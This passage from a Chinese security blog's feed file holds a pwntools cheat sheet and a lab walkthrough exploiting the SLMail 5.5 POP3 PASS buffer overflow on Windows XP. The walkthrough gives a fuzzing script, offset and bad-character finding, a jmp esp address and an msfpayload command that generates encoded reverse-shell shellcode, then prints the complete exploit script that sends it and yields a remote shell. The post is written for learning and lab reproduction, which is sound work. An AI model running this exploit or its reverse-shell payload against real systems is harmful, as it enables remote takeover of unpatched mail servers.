      <tag>Shellcode</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>PwnTools使用方法学习</title>
    <link href="/2018/10/PwnTools%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95%E5%AD%A6%E4%B9%A0/"/>
    <url>/2018/10/PwnTools%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95%E5%AD%A6%E4%B9%A0/</url>
    
    <content type="html"><![CDATA[<blockquote><p><code>pwntools</code>是一个CTF框架和漏洞利用开发库。它以Python编写，专为快速原型设计和开发而设计，旨在使漏洞利用编写尽可能简单。</p></blockquote><p>在CTF比赛中或者一些漏洞的利用过程中，使用pwntools这个优秀而便捷的库可以使原本复杂的脚本变得简单易读，本文会记录我个人在使用PwnTools过程中的一些技巧，长期更新</p><span id="more"></span><h2 id="与程序建立连接"><a href="#与程序建立连接" class="headerlink" title="与程序建立连接"></a>与程序建立连接</h2><p><strong>远程连接</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">io = remote( <span class="hljs-string">&#x27;ip&#x27;</span> , port )<br></code></pre></td></tr></table></figure><p><strong>本地连接</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">p = process( <span class="hljs-string">&#x27;/bin/sh&#x27;</span> )<br></code></pre></td></tr></table></figure><p><strong>转换为监听端口</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">l = listen()<br>conn = l.wait_for_connection()<br></code></pre></td></tr></table></figure><h2 id="打包函数-x2F-解包函数"><a href="#打包函数-x2F-解包函数" class="headerlink" title="打包函数&#x2F;解包函数"></a>打包函数&#x2F;解包函数</h2><p>将整数转化为字节序列&#x2F;将字节序列转换为整数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python">p32(<span class="hljs-number">0xdeadbeef</span>)<br>u32(<span class="hljs-number">0xdeadbeef</span>)<br>p64(<span class="hljs-number">0xdeadbeef</span>)<br>u64(<span class="hljs-number">0xdeadbeef</span>)<br></code></pre></td></tr></table></figure><h2 id="设置目标程序的架构"><a href="#设置目标程序的架构" class="headerlink" title="设置目标程序的架构"></a>设置目标程序的架构</h2><p><strong>一次性设定</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">context(arch=<span class="hljs-string">&#x27;arm&#x27;</span>, os=<span class="hljs-string">&#x27;linux&#x27;</span>, endian=<span class="hljs-string">&#x27;big&#x27;</span>, word_size=<span class="hljs-number">32</span>)<br></code></pre></td></tr></table></figure><p><strong>分开设定</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python">context.arch      = <span class="hljs-string">&#x27;i386&#x27;</span><br>context.os        = <span class="hljs-string">&#x27;linux&#x27;</span><br>context.endian    = <span class="hljs-string">&#x27;little&#x27;</span><br>context.word_size = <span class="hljs-number">32</span><br></code></pre></td></tr></table></figure><p><strong>日志信息的详细程度</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br></code></pre></td></tr></table></figure><h2 id="汇编与反汇编"><a href="#汇编与反汇编" class="headerlink" title="汇编与反汇编"></a>汇编与反汇编</h2><p><strong>汇编</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span>asm(<span class="hljs-string">&#x27;mov eax, 0&#x27;</span>).encode(<span class="hljs-string">&#x27;hex&#x27;</span>)<br><span class="hljs-string">&#x27;b800000000&#x27;</span><br></code></pre></td></tr></table></figure><p><strong>反汇编</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-built_in">print</span> disasm(<span class="hljs-string">&#x27;6a0258cd80ebf9&#x27;</span>.decode(<span class="hljs-string">&#x27;hex&#x27;</span>))<br>   <span class="hljs-number">0</span>:   6a 02                   push   <span class="hljs-number">0x2</span><br>   <span class="hljs-number">2</span>:   <span class="hljs-number">58</span>                      pop    eax<br>   <span class="hljs-number">3</span>:   cd <span class="hljs-number">80</span>                   <span class="hljs-built_in">int</span>    <span class="hljs-number">0x80</span><br>   <span class="hljs-number">5</span>:   eb f9                   jmp    <span class="hljs-number">0x0</span><br></code></pre></td></tr></table></figure><h2 id="偏移量计算"><a href="#偏移量计算" class="headerlink" title="偏移量计算"></a>偏移量计算</h2><p>可以使用gdb自带的偏移计算方法，也可以使用此方法进行自动化的分析</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-built_in">print</span> cyclic(<span class="hljs-number">20</span>)<br>aaaabaaacaaadaaaeaaa<br><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-comment"># Assume EIP = 0x62616166 (&#x27;faab&#x27; which is pack(0x62616166))  at crash time</span><br><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-built_in">print</span> cyclic_find(<span class="hljs-string">&#x27;faab&#x27;</span>)<br><span class="hljs-number">120</span><br></code></pre></td></tr></table></figure><h2 id="查看ELF信息"><a href="#查看ELF信息" class="headerlink" title="查看ELF信息"></a>查看ELF信息</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span>e = ELF(<span class="hljs-string">&#x27;/bin/cat&#x27;</span>)<br><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-built_in">print</span> <span class="hljs-built_in">hex</span>(e.address) <br><span class="hljs-number">0x400000</span><br><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-built_in">print</span> <span class="hljs-built_in">hex</span>(e.symbols[<span class="hljs-string">&#x27;write&#x27;</span>]) <br><span class="hljs-number">0x401680</span><br><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-built_in">print</span> <span class="hljs-built_in">hex</span>(e.got[<span class="hljs-string">&#x27;write&#x27;</span>]) <br><span class="hljs-number">0x60b070</span><br><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-built_in">print</span> <span class="hljs-built_in">hex</span>(e.plt[<span class="hljs-string">&#x27;write&#x27;</span>]) <br><span class="hljs-number">0x401680</span><br></code></pre></td></tr></table></figure><blockquote><h3 id="待更新。。。"><a href="#待更新。。。" class="headerlink" title="待更新。。。"></a>待更新。。。</h3></blockquote>]]></content>
    
    
    <categories>
      
      <category>二进制安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>PWN</tag>
      
      <tag>PwnTools</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Windows系统安全之SLMail缓冲区溢出漏洞复现</title>
    <link href="/2018/10/Windows%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8%E4%B9%8BSLmail%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    <url>/2018/10/Windows%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8%E4%B9%8BSLmail%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
    
    <content type="html"><![CDATA[<p>在我大二时任技术交流协会信安部部长时我曾给学弟学妹们介绍过这个关于<code>SLMail</code>的缓冲区溢出漏洞，给他们讲的原因是想扩展一下他们的知识面，现在我再重新温习一下这个漏洞来跟现阶段学习的Linux缓冲区漏洞做一个对比</p><hr><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>首先需要搭建实验环境，系统可选用<code>Windows_XP</code>，因为Windows7及以上的系统内置了多种安全措施使得此漏洞难以利用，本实验用到的软件及下载链接如下：</p><p><a href="https://slmail.software.informer.com/download/">SLMail 5.5.0 Mail Server</a></p><p><a href="https://www.softpedia.com/dyn-postdownload.php/dfb40d15ed797f293c5e48eb28f9a891/5bc69b64/277f7/4/1">ImmunityDebugger_1_85_setup</a></p><p><a href="https://raw.githubusercontent.com/corelan/mona/master/mona.py">mona.py</a></p><span id="more"></span><p>其中软件的安装都按照默认安装即可，mona.py需要放到Immunity Debugger的安装目录中：<code>\Immunity Inc\Immunity Debugger\PyCommands</code></p><p>至此环境配置完成，查看一下邮件的相关服务是否已经开启</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">netstat -nao<br></code></pre></td></tr></table></figure><p><img src="https://i.loli.net/2018/10/17/5bc69b7eaf1d5.png"></p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs cmd">win+r<br>向运行窗口中输入services.msc<br>查看相关服务的状态<br></code></pre></td></tr></table></figure><p><img src="https://i.loli.net/2018/10/17/5bc69cfd8cafe.png"></p><p>可以看到服务已经启动</p><h2 id="附加进程到调试器"><a href="#附加进程到调试器" class="headerlink" title="附加进程到调试器"></a>附加进程到调试器</h2><p>此时打开<code>Immunity Debugger</code>，点击菜单栏中的<code>File</code>选中<code>Attach</code></p><p><img src="https://i.loli.net/2018/10/17/5bc6a007a10ea.png"></p><p>选择如图的进程，此进程监听的端口包含110端口</p><p><img src="https://i.loli.net/2018/10/17/5bc6a06490046.png"></p><p>附加此进程后调试器界面如下</p><p><img src="https://i.loli.net/2018/10/17/5bc70c17dfd80.png"></p><p>此调试器的各个窗口我就不多介绍了，跟其他调试器大同小异</p><p>附加到进程后此进程会进入暂停状态，需要点击运行按钮使此进程正常进行</p><p><img src="https://i.loli.net/2018/10/17/5bc6a14bc24d7.png"></p><h2 id="远程连接，进行FUZZ测试"><a href="#远程连接，进行FUZZ测试" class="headerlink" title="远程连接，进行FUZZ测试"></a>远程连接，进行FUZZ测试</h2><p>程序正常运行后可以打开Kali Linux对此进程进行远程连接</p><p><img src="https://i.loli.net/2018/10/17/5bc70bec0b148.png"></p><p>我们已知此程序的PASS字段存在缓冲区溢出漏洞，现需确认产生溢出的位置，可使用脚本对不同长度的PASS字段的值进行<code>FUZZ</code>测试，当socket连接失败时及代表程序崩溃，已产生溢出，也可以使用<code>pattern_creat</code>产生足够长度的字符串</p><p>FUZZ脚本如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#/usr/bin/python</span><br><span class="hljs-comment">#coding:utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>payload=<span class="hljs-string">&quot;PASS &quot;</span><br><span class="hljs-built_in">len</span>=<span class="hljs-number">0</span><br><span class="hljs-keyword">while</span> <span class="hljs-number">1</span>:<br>r=remote(<span class="hljs-string">&#x27;192.168.229.134&#x27;</span>,<span class="hljs-number">110</span>)<br>r.send(<span class="hljs-string">&quot;USER administrator\n&quot;</span>)<br><span class="hljs-built_in">print</span> r.recv()<br>payload+=<span class="hljs-string">&quot;A&quot;</span>*<span class="hljs-number">200</span><br><span class="hljs-built_in">len</span>+=<span class="hljs-number">200</span><br><span class="hljs-built_in">print</span> <span class="hljs-string">&quot;sending payload length: &quot;</span>+<span class="hljs-built_in">str</span>(<span class="hljs-built_in">len</span>)<br>r.send(payload)<br>r.send(<span class="hljs-string">&quot;\n&quot;</span>)<br><span class="hljs-built_in">print</span> r.recv()<br></code></pre></td></tr></table></figure><p>运行此脚本后发现当程序发送2600个A之后卡住，回到<code>WindowsXP</code>查看调试器发现程序已经崩溃，且EIP内全部填充为了41即A的Hex ASCII码</p><p><img src="https://i.loli.net/2018/10/17/5bc6a780a9413.png"></p><p>因此可以确定溢出处位置再2600-2700之间，此时我们需要重新启动此服务，我们可以借助<code>pattern_creat</code>和<code>pattern_offset</code>这两个指令来进一步确定溢出点</p><p>这两个指令可以在<code>/usr/share/metasploit-framework/tools/exploit/</code>目录下找到，也可以直接用GDB</p><p><img src="https://i.loli.net/2018/10/17/5bc6a89a1c63d.png"></p><p>即可生成2700个具有位置特征的字符串</p><p>使用此字符串填充PASS字段:</p><p><img src="https://i.loli.net/2018/10/17/5bc6a9bbe897d.png"></p><p>发送后发现程序无回显</p><p>进入Windows_XP中发现程序再次崩溃且EIP寄存器中的内容为<code>45417845</code></p><p><img src="https://i.loli.net/2018/10/17/5bc6aa0b03a5c.png"></p><p>而寄存器采用大端序存储数据即高字节保存在内存的低地址，因而EIP寄存器中的内容是<code>45 78 41 45</code>，按照ASCII转化为字符为：<code>ExAE</code></p><p>使用pattern_offset指令来找到这个字符串的位置</p><p><img src="https://i.loli.net/2018/10/17/5bc6ab765b443.png"></p><p>到这里我们已经确定了溢出产生的位置，另外我们可以看到<code>ESP</code>寄存器中的数据填充着2610个字符之后的字符，选中ESP并点击右键</p><p><img src="https://i.loli.net/2018/10/17/5bc6accf34d74.png"></p><p>可以看到如下内容</p><p><img src="https://i.loli.net/2018/10/17/5bc6ad01008d5.png"></p><p>可以通过起始地址和结束地址计算出ESP寄存器的大小为424字节，完全可以放进去一个<code>shellcode</code>，因此我们可以把<code>Shellcode</code>放到<code>ESP</code>里面，但是我们在编写shellcode的时候需要注意“坏字符”的影响，即有的字符在系统中有不同的涵义如：</p><ol><li><p>NULL byte（0x00）空字符，用于终止字符串的拷贝操作</p></li><li><p>return（0x0D）回车操作，表示POP3 PASS命令输入完成</p></li></ol><p>这些坏字符可能会对shellcode的正常运行和写入造成影响，我们需要把这些坏字符给找出来，通过连续发送0x00~0xff之间的字符，再对比ESP寄存器中的数据，找出如下的坏字符：</p><p><code>0A</code>、<code>0D</code>、<code>00</code></p><p>坏字符找到了我们可以把去掉坏字符的shellcode放到ESP中，但是ESP的地址会发生变化，我们无法通过将ESP的地址EIP中来完成指令的跳转，因此我们需要找到一个跳板，即再内存中寻找一个位置固定的指令<code>jmp esp</code>,然后通过这个指令使得ESP中的代码得到执行，这里就用到mona.py了</p><h2 id="寻找跳板"><a href="#寻找跳板" class="headerlink" title="寻找跳板"></a>寻找跳板</h2><p>使用<code>!mona modules</code>指令查看模块</p><p><img src="https://i.loli.net/2018/10/17/5bc6e281777e8.png"></p><p>如图示，这是进程的安全措施，我们需要找没有安全措施保护的模块，即值为<code>False</code></p><p><img src="https://i.loli.net/2018/10/17/5bc6e2c141127.png"></p><p>其中<code>Rebase</code>表示重启后是否会改变地址、False即不改变；<code>SafeSEH</code>、<code>ASLR</code>、<code>NXCompat</code>这三项都是Windows相关的安全机制；<code>OS Dll</code>表示是否是OS自带的库。即前四列选False，最后一列选True。</p><p>符合以上条件的模块有三个，从这三个模块中逐一尝试寻找<code>jmp esp</code>指令</p><p>可使用<code>/usr/share/metasploit-framework/tools/exploit</code> 目录下的<code>nasm_shell.rb</code>来得到<code>jmp esp</code>的十六进制形式</p><p><img src="https://i.loli.net/2018/10/17/5bc6ec438e83a.png"></p><p>通过指令</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">!mona find -s &quot;\xff\xe4&quot; -m SLMFC.dll<br></code></pre></td></tr></table></figure><p>在<code>SLMFC.dll</code>寻找<code>FFE4</code>，共找到19个结果：</p><p><img src="https://i.loli.net/2018/10/17/5bc6ecfe2634f.png"></p><p>右键选中并复制此指令的地址</p><p><img src="https://i.loli.net/2018/10/17/5bc6eeb31c836.png"></p><p>将此地址粘贴到脚本内</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#/usr/bin/python</span><br><span class="hljs-comment">#coding:utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>payload=<span class="hljs-string">&quot;PASS &quot;</span><br>r=remote(<span class="hljs-string">&#x27;192.168.229.134&#x27;</span>,<span class="hljs-number">110</span>)<br><span class="hljs-built_in">print</span> r.recv()<br>r.send(<span class="hljs-string">&quot;USER administrator\n&quot;</span>)<br><span class="hljs-built_in">print</span> r.recv()<br>payload+=<span class="hljs-string">&quot;A&quot;</span>*<span class="hljs-number">2606</span>+p32(<span class="hljs-number">0x5F4A358F</span>)+<span class="hljs-string">&quot;b&quot;</span>*<span class="hljs-number">400</span>+<span class="hljs-string">&quot;\n&quot;</span><br>r.send(payload)<br><span class="hljs-built_in">print</span> payload<br><span class="hljs-built_in">print</span> r.recv()<br></code></pre></td></tr></table></figure><p>运行脚本</p><p><img src="https://i.loli.net/2018/10/17/5bc6f6e4d4c49.png"></p><p><img src="https://i.loli.net/2018/10/17/5bc6f70b19ecb.png"></p><p>此时EIP指向ESP，说明这个地址的<code>jmp esp</code>产生了效果，我们可以将shellcode放入ESP中了</p><h2 id="Shellcode生成及利用"><a href="#Shellcode生成及利用" class="headerlink" title="Shellcode生成及利用"></a>Shellcode生成及利用</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs bash"> ⚡ root@kali  /usr/share/framework2  ./msfpayload win32_reverse EXITFUNC=thread LHOST=192.168.229.136 LPORT=6666 R | ./msfencode -b <span class="hljs-string">&quot;\x00\x0a\x0d&quot;</span><br>[*] Using Msf::Encoder::PexFnstenvMov with final size of 310 bytes<br><span class="hljs-string">&quot;\x6a\x48\x59\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\x76\x3a\x2f&quot;</span>.<br><span class="hljs-string">&quot;\x54\x83\xeb\xfc\xe2\xf4\x8a\x50\xc4\x19\x9e\xc3\xd0\xab\x89\x5a&quot;</span>.<br><span class="hljs-string">&quot;\xa4\x38\x52\x1e\xa4\x11\x4a\xb1\x53\x51\x0e\x3b\xc0\xdf\x39\x22&quot;</span>.<br><span class="hljs-string">&quot;\xa4\x0b\x56\x3b\xc4\x1d\xfd\x0e\xa4\x55\x98\x0b\xef\xcd\xda\xbe&quot;</span>.<br><span class="hljs-string">&quot;\xef\x20\x71\xfb\xe5\x59\x77\xf8\xc4\xa0\x4d\x6e\x0b\x7c\x03\xdf&quot;</span>.<br><span class="hljs-string">&quot;\xa4\x0b\x52\x3b\xc4\x32\xfd\x36\x64\xdf\x29\x26\x2e\xbf\x75\x16&quot;</span>.<br><span class="hljs-string">&quot;\xa4\xdd\x1a\x1e\x33\x35\xb5\x0b\xf4\x30\xfd\x79\x1f\xdf\x36\x36&quot;</span>.<br><span class="hljs-string">&quot;\xa4\x24\x6a\x97\xa4\x14\x7e\x64\x47\xda\x38\x34\xc3\x04\x89\xec&quot;</span>.<br><span class="hljs-string">&quot;\x49\x07\x10\x52\x1c\x66\x1e\x4d\x5c\x66\x29\x6e\xd0\x84\x1e\xf1&quot;</span>.<br><span class="hljs-string">&quot;\xc2\xa8\x4d\x6a\xd0\x82\x29\xb3\xca\x32\xf7\xd7\x27\x56\x23\x50&quot;</span>.<br><span class="hljs-string">&quot;\x2d\xab\xa6\x52\xf6\x5d\x83\x97\x78\xab\xa0\x69\x7c\x07\x25\x79&quot;</span>.<br><span class="hljs-string">&quot;\x7c\x17\x25\xc5\xff\x3c\xb6\x92\xca\xdc\x10\x52\x35\x5e\x10\x69&quot;</span>.<br><span class="hljs-string">&quot;\xa6\xb5\xe3\x52\xc3\xad\xdc\x5a\x78\xab\xa0\x50\x3f\x05\x23\xc5&quot;</span>.<br><span class="hljs-string">&quot;\xff\x32\x1c\x5e\x49\x3c\x15\x57\x45\x04\x2f\x13\xe3\xdd\x91\x50&quot;</span>.<br><span class="hljs-string">&quot;\x6b\xdd\x94\x0b\xef\xa7\xdc\xaf\xa6\xa9\x88\x78\x02\xaa\x34\x16&quot;</span>.<br><span class="hljs-string">&quot;\xa2\x2e\x4e\x91\x84\xff\x1e\x48\xd1\xe7\x60\xc5\x5a\x7c\x89\xec&quot;</span>.<br><span class="hljs-string">&quot;\x74\x03\x24\x6b\x7e\x05\x1c\x3b\x7e\x05\x23\x6b\xd0\x84\x1e\x97&quot;</span>.<br><span class="hljs-string">&quot;\xf6\x51\xb8\x69\xd0\x82\x1c\xc5\xd0\x63\x89\xea\x47\xb3\x0f\xfc&quot;</span>.<br><span class="hljs-string">&quot;\x56\xab\x03\x3e\xd0\x82\x89\x4d\xd3\xab\xa6\x52\xc0\x9a\x96\x5a&quot;</span>.<br><span class="hljs-string">&quot;\x7c\xab\xa0\xc5\xff\x54&quot;</span>;<br></code></pre></td></tr></table></figure><p>使用以上命令生成去除坏字符的shellcode，得到完整的攻击脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#/usr/bin/python</span><br><span class="hljs-comment">#coding:utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>shellcode = (<br><span class="hljs-string">&quot;\x6a\x48\x59\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\x76\x3a\x2f&quot;</span>+<br><span class="hljs-string">&quot;\x54\x83\xeb\xfc\xe2\xf4\x8a\x50\xc4\x19\x9e\xc3\xd0\xab\x89\x5a&quot;</span>+<br><span class="hljs-string">&quot;\xa4\x38\x52\x1e\xa4\x11\x4a\xb1\x53\x51\x0e\x3b\xc0\xdf\x39\x22&quot;</span>+<br><span class="hljs-string">&quot;\xa4\x0b\x56\x3b\xc4\x1d\xfd\x0e\xa4\x55\x98\x0b\xef\xcd\xda\xbe&quot;</span>+<br><span class="hljs-string">&quot;\xef\x20\x71\xfb\xe5\x59\x77\xf8\xc4\xa0\x4d\x6e\x0b\x7c\x03\xdf&quot;</span>+<br><span class="hljs-string">&quot;\xa4\x0b\x52\x3b\xc4\x32\xfd\x36\x64\xdf\x29\x26\x2e\xbf\x75\x16&quot;</span>+<br><span class="hljs-string">&quot;\xa4\xdd\x1a\x1e\x33\x35\xb5\x0b\xf4\x30\xfd\x79\x1f\xdf\x36\x36&quot;</span>+<br><span class="hljs-string">&quot;\xa4\x24\x6a\x97\xa4\x14\x7e\x64\x47\xda\x38\x34\xc3\x04\x89\xec&quot;</span>+<br><span class="hljs-string">&quot;\x49\x07\x10\x52\x1c\x66\x1e\x4d\x5c\x66\x29\x6e\xd0\x84\x1e\xf1&quot;</span>+<br><span class="hljs-string">&quot;\xc2\xa8\x4d\x6a\xd0\x82\x29\xb3\xca\x32\xf7\xd7\x27\x56\x23\x50&quot;</span>+<br><span class="hljs-string">&quot;\x2d\xab\xa6\x52\xf6\x5d\x83\x97\x78\xab\xa0\x69\x7c\x07\x25\x79&quot;</span>+<br><span class="hljs-string">&quot;\x7c\x17\x25\xc5\xff\x3c\xb6\x92\xca\xdc\x10\x52\x35\x5e\x10\x69&quot;</span>+<br><span class="hljs-string">&quot;\xa6\xb5\xe3\x52\xc3\xad\xdc\x5a\x78\xab\xa0\x50\x3f\x05\x23\xc5&quot;</span>+<br><span class="hljs-string">&quot;\xff\x32\x1c\x5e\x49\x3c\x15\x57\x45\x04\x2f\x13\xe3\xdd\x91\x50&quot;</span>+<br><span class="hljs-string">&quot;\x6b\xdd\x94\x0b\xef\xa7\xdc\xaf\xa6\xa9\x88\x78\x02\xaa\x34\x16&quot;</span>+<br><span class="hljs-string">&quot;\xa2\x2e\x4e\x91\x84\xff\x1e\x48\xd1\xe7\x60\xc5\x5a\x7c\x89\xec&quot;</span>+<br><span class="hljs-string">&quot;\x74\x03\x24\x6b\x7e\x05\x1c\x3b\x7e\x05\x23\x6b\xd0\x84\x1e\x97&quot;</span>+<br><span class="hljs-string">&quot;\xf6\x51\xb8\x69\xd0\x82\x1c\xc5\xd0\x63\x89\xea\x47\xb3\x0f\xfc&quot;</span>+<br><span class="hljs-string">&quot;\x56\xab\x03\x3e\xd0\x82\x89\x4d\xd3\xab\xa6\x52\xc0\x9a\x96\x5a&quot;</span>+<br><span class="hljs-string">&quot;\x7c\xab\xa0\xc5\xff\x54&quot;</span>)<br><br>payload=<span class="hljs-string">&quot;PASS &quot;</span><br>r=remote(<span class="hljs-string">&#x27;192.168.229.134&#x27;</span>,<span class="hljs-number">110</span>)<br><span class="hljs-built_in">print</span> r.recv()<br>r.send(<span class="hljs-string">&quot;USER administrator\n&quot;</span>)<br><span class="hljs-built_in">print</span> r.recv()<br>payload+=<span class="hljs-string">&quot;A&quot;</span>*<span class="hljs-number">2606</span>+p32(<span class="hljs-number">0x5F4A358F</span>)+<span class="hljs-string">&quot;A&quot;</span>*<span class="hljs-number">8</span>+shellcode+<span class="hljs-string">&quot;\n&quot;</span><br><span class="hljs-string">&#x27;&#x27;&#x27;在shellcode之前添加8个字节以保证shellcode的完整性&#x27;&#x27;&#x27;</span><br>r.send(payload)<br><span class="hljs-built_in">print</span> payload<br><span class="hljs-built_in">print</span> r.recv()<br></code></pre></td></tr></table></figure><p>在本地6666端口监听，运行此脚本得到反弹的shell：</p><p><img src="https://i.loli.net/2018/10/17/5bc70bbca55b1.png"></p><p>漏洞利用成功！🔥</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ul><li><p>缓冲区溢出是一个经典而危害巨大的漏洞，通过重温这个漏洞，我对Windows的安全机制及漏洞利用方式又有了新的认识。</p></li><li><p>脚本不是拿来复制的，而是要自己学会写，要会根据实际情况灵活变通。</p></li><li><p>细心，再从<code>GitHub</code>上下载<code>mona</code>的时候我用系统自带的笔记本粘贴<code>mona</code>结果在<code>immunity</code>中无法使用，因为粘贴的不完整，需要用<code>notepad</code>等编辑器粘贴</p></li><li><p>安全是一个在不断的技术进步中逐渐完善的点，攻防是在不断地博弈中愈发精彩的舞曲，有趣！🤩</p></li></ul>]]></content>
    
    
    <categories>
      
      <category>二进制安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Windows系统安全</tag>
      
      <tag>缓冲区溢出</tag>
      
      <tag>Slmail</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>我的桌面</title>
    <link href="/2018/10/%E6%88%91%E7%9A%84%E6%A1%8C%E9%9D%A2/"/>
    <url>/2018/10/%E6%88%91%E7%9A%84%E6%A1%8C%E9%9D%A2/</url>
    
